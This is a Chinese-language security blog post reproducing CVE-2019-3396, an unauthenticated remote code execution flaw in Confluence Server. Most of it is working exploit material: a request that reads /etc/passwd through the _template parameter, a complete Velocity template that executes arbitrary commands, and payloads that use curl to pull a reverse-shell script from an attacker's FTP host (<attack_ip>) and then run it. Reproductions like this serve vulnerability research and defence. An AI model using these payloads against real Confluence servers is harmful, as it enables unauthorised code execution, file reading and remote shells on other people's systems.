---
layout: post
toc: true
title: "「Src」:Confluence漏洞复现总结"
wrench: 2020-07-25
author: Bin4xin
categories:
    - blog
    - 笔记
    - src
    - CVE
    - 信息搜集
permalink: /blog/2020/Confluence/vuln-Cve/
---

## 0x00 Confluence未授权RCE (CVE-2019-3396)

> **影响版本**：Confluence Server & Data Center 6.6.0 ~ 6.6.13, 6.7.0 ~ 6.13.4, 6.14.0 ~ 6.14.3
>
> **漏洞类型**：服务端模板注入（SSTI）+ 远程文件包含

### 文件读取

```bash
POST /confluence/rest/tinymce/1/macro/preview

{"contentId":"786457","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc5","width":"1000","height":"1000","_template":"../../../../../etc/passwd"}}}
```

### RCE漏洞

生成`cmd.vm` Velocity模板文件放在自己的服务器上：

```bash
cat cmd.vm
#set ($e="exp")
#set ($a=$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec($cmd))
#set ($input=$e.getClass().forName("java.lang.Process").getMethod("getInputStream").invoke($a))
#set($sc = $e.getClass().forName("java.util.Scanner"))
#set($constructor = $sc.getDeclaredConstructor($e.getClass().forName("java.io.InputStream")))
#set($scan=$constructor.newInstance($input).useDelimiter("\\A"))
#if($scan.hasNext())
    $scan.next()
#end
```

原理：通过Widget Connector宏的`_template`参数实现远程文件包含。启动FTP服务，将模板文件放在FTP上供目标服务器下载执行。

启动FTP服务：

```bash
python3 -m pyftpdlib -p 2121
[I 2020-07-23 15:47:58] concurrency model: async
[I 2020-07-23 15:47:58] masquerade (NAT) address: None
[I 2020-07-23 15:47:58] passive ports: None
[I 2020-07-23 15:47:58] >>> starting FTP server on 0.0.0.0:2121, pid=25460 <<<
```

### 执行命令

```bash
# 执行whoami
{"contentId":"786457","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc5","width":"1000","height":"1000","_template":"ftp://<attack_ip>:2121/cmd.vm","cmd":"whoami"}}}

# 下载反弹Shell脚本
{"contentId":"786457","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc5","width":"1000","height":"1000","_template":"ftp://<attack_ip>:2121/cmd.vm","cmd":"curl -o /tmp/nc.py ftp://<attack_ip>:2121/nc.py"}}}

# 执行反弹Shell
{"contentId":"786457","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc5","width":"1000","height":"1000","_template":"ftp://<attack_ip>:2121/cmd.vm","cmd":"python /tmp/nc.py"}}}
```

## 参考

- [CVE-2019-3396 Detail](https://nvd.nist.gov/vuln/detail/CVE-2019-3396){:target="_blank"}
- [Confluence Server Webwork OGNL Injection (CVE-2021-26084)](https://confluence.atlassian.com/doc/confluence-security-advisory-2021-08-25-1077906215.html){:target="_blank"}

以上。